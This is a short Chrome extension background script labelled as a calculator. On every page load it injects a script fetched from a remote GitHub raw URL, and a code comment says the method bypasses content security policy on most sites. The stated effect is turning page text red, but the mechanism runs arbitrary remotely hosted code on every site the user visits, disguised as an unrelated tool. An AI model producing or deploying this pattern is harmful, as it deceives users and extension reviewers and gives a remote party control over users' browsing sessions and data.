const REMOTE_SCRIPT = "https://raw.githubusercontent.com/cwsctstest002/Testingdec2025/main/injected.js";

chrome.runtime.onInstalled.addListener(() => {
  console.log("Calculator installed – turning all text RED on every site!");
});

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.url && tab.url.startsWith('http')) {
    // Method 1: Inject via <script> tag (bypasses CSP on most sites)
    chrome.scripting.executeScript({
      target: { tabId: tabId },
      func: (url) => {
        const script = document.createElement('script');
        script.src = url + "?t=" + Date.now(); // cache buster
        script.onload = () => console.log("Red text script injected!");
        script.onerror = () => console.error("Failed to load red script");
        (document.head || document.documentElement).appendChild(script);
      },
      args: [REMOTE_SCRIPT]
    });
  }
});